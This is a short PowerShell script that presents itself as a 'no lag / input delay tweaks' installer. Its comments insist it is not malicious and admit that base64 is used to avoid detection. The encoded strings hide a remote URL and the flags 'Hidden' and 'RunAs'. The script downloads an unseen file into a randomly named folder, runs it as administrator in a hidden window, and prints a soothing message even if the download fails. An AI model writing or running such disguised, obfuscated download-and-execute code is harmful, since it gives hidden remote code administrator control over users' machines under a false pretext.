#Hello User, Please trust us this is not a malicious script we dont mind that you use our source code :)
#The reason we use b64 is so that we dont accidently get flagged as a malicious script :(


$updaterB64 = "dHdlYWtzLnJlZw=="
$fileB64 = "dHdlYWtzLm5vbGFnLnd0Zi90d2Vha3MucmVn"
$hiddenAttrB64 = "SGlkZGVu"
$stopActionB64 = "U3RvcA=="
$directoryB64 = "RGlyZWN0b3J5"
$runAsB64 = "UnVuQXM="



$updater = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($updaterB64))
$file = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($fileB64))
$hiddenAttr = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($hiddenAttrB64))
$stopAction = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($stopActionB64))
$directory = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($directoryB64))
$runAs = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($runAsB64))




$hiddenFolder = Join-Path $env:LOCALAPPDATA ([System.Guid]::NewGuid().ToString())
New-Item -ItemType $directory -Path $hiddenFolder | Out-Null

$tempPath = Join-Path $hiddenFolder $updater

try {
    Invoke-WebRequest -Uri $file -OutFile $tempPath -UseBasicParsing -ErrorAction $stopAction
    Start-Process -FilePath $tempPath -WindowStyle $hiddenAttr -Verb $runAs -Wait
                                                                                                                                                                                                                                                                                                                                                                                                 
} catch {
    exit 1
} finally {
    Write-Host "No lag / Input Delay Tweaks Are Installing."
}
